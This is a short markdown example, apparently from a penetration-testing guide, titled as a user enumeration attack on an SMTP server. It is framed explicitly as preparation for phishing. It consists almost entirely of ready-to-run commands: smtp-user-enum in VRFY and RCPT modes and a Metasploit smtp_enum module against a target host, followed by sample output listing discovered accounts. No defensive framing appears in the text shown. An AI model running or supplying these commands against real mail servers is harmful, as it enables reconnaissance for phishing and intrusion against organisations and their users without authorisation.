# Example 2: User Enumeration Attack

**Scenario:** Enumerate valid users for phishing preparation

```bash
# Method 1: VRFY
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.100 -p 25

# Method 2: RCPT with timing analysis
smtp-user-enum -M RCPT -U users.txt -t 192.168.1.100 -p 25 -d target.com

# Method 3: Metasploit
msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
run

# Results show valid users
[+] 192.168.1.100:25 - Found user: admin
[+] 192.168.1.100:25 - Found user: root
[+] 192.168.1.100:25 - Found user: postmaster
```